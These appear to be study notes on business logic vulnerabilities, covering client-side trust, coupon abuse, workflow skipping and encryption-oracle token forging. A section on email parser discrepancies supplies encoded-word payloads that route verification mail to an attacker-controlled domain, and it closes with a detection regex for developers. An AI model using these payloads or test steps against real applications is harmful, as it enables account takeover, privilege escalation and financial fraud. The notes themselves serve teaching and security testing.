## Business Logic Vulnerabilities

---

### What Are Business Logic Vulnerabilities?

Flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior by exploiting legitimate functionality to achieve a malicious goal.

Also known as:
- Application logic vulnerabilities
- Logic flaws

---

### How Do They Arise?

- Developers make wrong assumptions about how users will interact
- Trusting client-side controls instead of server-side validation
- Large codebases where no one understands the full picture
- Poor documentation of assumptions
- Team handoffs where old rules are not communicated

---

### Impact

| Flaw Location | Potential Impact |
|---|---|
| Authentication | Critical — full account takeover |
| Financial transactions | Critical — real money loss |
| Admin/privilege logic | Critical — unauthorized access |
| User settings/profile | Medium — data manipulation |
| UI/display logic | Low — but still worth fixing |

---

### Types of Business Logic Vulnerabilities

---

#### 1. Excessive Trust in Client-Side Controls

App relies on client-side validation instead of server-side.

**Example:**
Price is set in the webpage and sent in the request. Attacker intercepts and changes price to $1.

**How to test:**
- Intercept requests in Burp Proxy
- Modify parameters like price, quantity, discount
- See if server accepts the changes

---

#### 2. High-Level Logic Vulnerability

App does not validate that values make logical sense.

**Example:**
Setting quantity to a negative number reduces the cart total.

**How to test:**
- Try negative values in quantity fields
- Try negative values in price fields
- See if total goes negative

---

#### 3. Inconsistent Security Controls

Security rules exist but are only enforced in some places and not others.

**Example:**
App checks email domain at registration but not when changing email later. Attacker registers normally then changes email to @targetdomain.com to get admin access.

**How to test:**
- Register with normal email
- Go to account settings
- Change email to privileged domain
- Check if admin access is granted

---

#### 4. Flawed Enforcement of Business Rules

The rule exists everywhere but the checking logic is too simple and easy to trick.

**Example:**
Coupon can only be used once but app only checks if the LAST used coupon is the same. Attacker alternates between two coupons infinitely.

**How to test:**
- Apply coupon once
- Apply different coupon
- Re-apply first coupon
- See if it is accepted again
- Repeat until price hits zero

---

#### 5. Inconsistent Handling of Exceptional Input

Same input treated differently by validation vs database due to truncation.

**Example:**
Database stores only 255 characters. Attacker submits 300 character email ending in @targetdomain.com.attacker.com. After truncation it becomes @targetdomain.com giving admin access.

**How to test:**
- Submit very long input in email fields
- Craft input so truncation removes the attacker part
- Check if privileged access is granted

---

#### 6. Making Assumptions About Sequence of Events

App assumes users follow intended workflow order. Attacker skips, repeats, or reverses steps.

**Example:**
Add to cart → Skip payment → Go straight to order confirmation. App never verified payment happened.

**How to test:**
- Skip steps in a workflow
- Repeat the same step multiple times
- Go backwards in a workflow
- Access steps directly by URL
- Note any error messages — they reveal backend behavior

---

#### 7. Infinite Money Logic Flaw

Combining multiple features creates unintended profit loop.

**Example:**
Buy gift card for $10, apply 30% coupon to pay $7, redeem gift card for $10 back. Net profit $3 per cycle.

**How to test:**
- Look for gift cards and discount codes
- Check if they can be combined
- Check if the combination creates a profit loop
- Use Burp Macro + Intruder to automate the loop

---

#### 8. Authentication Bypass via Encryption Oracle

App accidentally lets attacker encrypt arbitrary data using its own secret key. Attacker forges a legitimate looking token.

**Example:**
Email parameter encrypts input into notification cookie. Stay-logged-in cookie uses same encryption. Attacker uses email parameter to encrypt administrator:timestamp, removes unwanted prefix using block cipher mechanics, uses result as stay-logged-in cookie to log in as admin.

**How to test:**
- Look for encrypted cookies
- Test if any input parameter produces an encrypted output
- Check if both encryption and decryption are available
- Attempt to forge privileged tokens

---

### Key Concepts

#### Block Cipher Mechanics
- Data is encrypted in fixed 16 byte blocks
- Can only delete data in multiples of 16 bytes
- Formula: next multiple of 16 minus prefix length = padding needed

#### Encryption Oracle
- App encrypts anything you give it using its own key
- Dangerous when other parts of the app trust the same encryption

#### Decryption Oracle
- App decrypts anything you give it and shows the output
- Used to reverse engineer token format and structure

---

### Tools Used

| Tool | Purpose |
|---|---|
| Burp Proxy | Intercept and modify requests |
| Burp Repeater | Manually resend and modify requests |
| Burp Intruder | Automate sending many requests |
| Turbo Intruder | High speed request automation |
| Burp Decoder | Encode and decode values |
| Burp Macro | Automate sequences of requests |
| Burp Collaborator | Receive out of band interactions |

---

## Email Parser Discrepancies

---

### What Is It?

Two different systems parse the same email address differently. The validator sees one thing, the email server sees another.

---

### Why It Happens

Email RFC standards are over 50 years old and extremely complex. Different libraries implement parsing differently leading to discrepancies.

---

### Encoded Word Format

```
=?charset?encoding_method?encoded_data?=
```

| Part | Options |
|---|---|
| charset | utf-7, utf-8, iso-8859-1, utf-16, etc |
| encoding_method | q (Q-Encoding), b (Base64) |
| encoded_data | the encoded characters |

---

### Testing Order (Real World)

**Round 1 — Most Common:**
```
=?iso-8859-1?q?=61=62=63?=collab@yourserver.com@targetdomain.com
=?utf-8?q?=61=62=63?=collab@yourserver.com@targetdomain.com
```

**Round 2 — Less Common:**
```
=?utf-7?q?&AGEAYgBj-?=collab@yourserver.com@targetdomain.com
=?x?q?=61=62=63?=collab@yourserver.com@targetdomain.com
```

**Round 3 — Rarely Supported:**
```
=?utf-16?q?=61=62=63?=collab@yourserver.com@targetdomain.com
=?utf-32?q?=61=62=63?=collab@yourserver.com@targetdomain.com
=?us-ascii?q?=61=62=63?=collab@yourserver.com@targetdomain.com
```

---

### Attack Payload Format

**UTF-7:**
```
=?utf-7?q?attacker&AEA-exploitserver.com&ACA-?=@targetdomain.com
```

**UTF-8:**
```
=?utf-8?q?attacker=40exploitserver.com=20?=@targetdomain.com
```

---

### Real World Victims

| Target | Impact |
|---|---|
| Github | Bypass Cloudflare Zero Trust |
| Zendesk | Access protected support centres |
| Gitlab | Unauthorized Enterprise access |
| Joomla | Full Remote Code Execution |

---

### How to Detect (For Developers)

Use this regex to detect encoded word attacks:
```
=[?].+[?]=
```

Never use email domain as sole means of authorization.

